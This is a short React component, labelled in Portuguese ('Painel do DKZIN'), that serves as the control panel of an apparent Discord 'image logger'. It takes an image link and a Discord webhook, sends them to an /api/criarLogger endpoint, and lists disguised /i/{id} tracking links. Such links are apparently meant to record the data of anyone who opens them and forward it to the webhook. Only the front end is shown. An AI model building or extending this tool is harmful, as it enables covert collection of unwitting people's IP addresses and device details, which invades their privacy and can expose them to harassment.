import { useState } from "react"
export default function Painel(){
  const [image,setImage]=useState("")
  const [webhook,setWebhook]=useState("")
  const [loggers,setLoggers]=useState([])

  const criarLogger=async()=>{
    const res=await fetch("/api/criarLogger",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({image,webhook})
    })
    const data=await res.json()
    setLoggers([...loggers,data])
  }

  return(
    <div>
      <h1>Painel do DKZIN</h1>
      <input placeholder="Link da imagem" value={image} onChange={e=>setImage(e.target.value)} />
      <input placeholder="Webhook Discord" value={webhook} onChange={e=>setWebhook(e.target.value)} />
      <button onClick={criarLogger}>Criar Image Logger</button>
      <ul>
        {loggers.map(log=><li key={log.id}><a href={`/i/${log.id}`}>Link: /i/{log.id}</a></li>)}
      </ul>
    </div>
  )
    }
